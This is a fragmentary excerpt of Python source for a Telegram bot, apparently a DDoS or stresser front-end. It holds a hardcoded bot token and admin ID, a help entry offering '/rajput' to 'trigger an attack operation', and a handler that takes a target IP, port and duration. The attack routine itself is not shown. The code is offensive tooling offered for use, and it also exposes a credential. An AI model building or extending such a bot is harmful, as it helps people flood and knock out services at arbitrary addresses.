...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7998644259:AAFAJmVy1kVEX8WBcVrWSgWqP4SkQ068uQk'
ADMIN_USER_ID = 1821595166  # Replace with your admin user ID
...
async def help_command(update: Update, context: CallbackContext):
    ...
    if user_id != ADMIN_USER_ID:
        ...
        help_text = (
            ...
            "*🔸 /rajput* - Trigger an attack operation.\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /rajput <ip> <port> <duration>*", parse_mode='Markdown')
        return
...
def main():
    ...
    application.add_handler(CommandHandler("rajput", attack))
